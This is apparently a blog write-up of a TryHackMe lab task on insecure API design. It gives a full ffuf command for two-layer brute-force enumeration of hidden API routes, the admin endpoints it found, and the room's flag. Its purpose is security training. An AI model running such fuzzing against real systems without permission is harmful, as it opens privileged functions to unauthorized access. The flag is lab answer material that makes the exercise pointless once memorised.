---
title: "TryHackMe | OWASP Top 10 2025 – Insecure Design (Task 5)"
date: 2026-01-01
tags: [tryhackme,owasp-top-10,insecure-design,api-enumeration,ffuf,web-security]
---

## Context

**Path:** TryHackMe – OWASP Top 10 (2025)  
**Section:** Application Design Flaws  
**Task:** Task 5 – Insecure Design  

This task was one of those moments where brute force alone is not enough. I initially felt stuck because standard enumeration patterns did not immediately reveal useful API routes. The breakthrough came from stepping back and thinking about *coverage*, not speed.

---

## Key Difficulty

The application exposed an API structure, but routes were not obvious or documented. Single-layer wordlist fuzzing did not yield meaningful results, which forced a shift in strategy.

The lesson was not about trying harder, but about **expanding surface area intelligently**.

---

## What Task 5 Taught Me

### 1. Best Wordlist for API Route Coverage

For API discovery, the most effective wordlist I found was:

```
/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
```

This wordlist provides extremely broad coverage and is especially effective against REST-style APIs where naming conventions are predictable but undocumented.

---

### 2. Layered API Route Enumeration

Instead of fuzzing a single directory level, I layered **the same high-coverage wordlist twice** to brute-force nested API routes.

In a real engagement, you would always start with one layer. Only after finding nothing meaningful would you escalate to layered fuzzing. Here, the lab environment allowed aggressive exploration.

**Target pattern:**

```
http://target-ip:5005/api/W1/W2
```

---

## Final ffuf Command Used

```bash
ffuf -u "http://target-ip:5005/api/W1/W2" \
-w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt:W1 \
-w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt:W2 \
-mc 200,204,301,302,307,401,403,405 \
-t 40
```

---

## ffuf Results

```text
[Status: 200, Size: 73, Words: 10, Lines: 6]
  W1: users
  W2: admin

[Status: 200, Size: 154, Words: 35, Lines: 10]
  W1: messages
  W2: admin
```

These results revealed the following valid API paths:

- `/api/users/admin`
- `/api/messages/admin`

---

## Privileged API Response

Querying the discovered endpoint returned sensitive system data:

```json
{
  "messages": [
    {
      "content": "Admin panel access key: THM{1NS3CUR3_D351GN_4SSUMPT10N}",
      "from": "system"
    }
  ],
  "user": "admin"
}
```

---

## Results & Observations

- Theoretical search space: **~3 billion combinations**
- Practical outcome: Valid API routes appeared at around **100,000 requests**
- Time to first meaningful hits: **~15 minutes**
- Root cause: **Insecure design assumptions at the API layer**

This reinforces a core offensive principle:  
**You rarely need to finish enumeration. You only need to go far enough to break the assumption.**

---

## Core Takeaway

Task 5 demonstrated insecure design at an architectural level. When APIs rely on obscurity rather than explicit access control, attackers can enumerate their way into privileged functionality.

The win here was not the tool.  
The win was **thinking in layers** and prioritizing coverage over convenience.
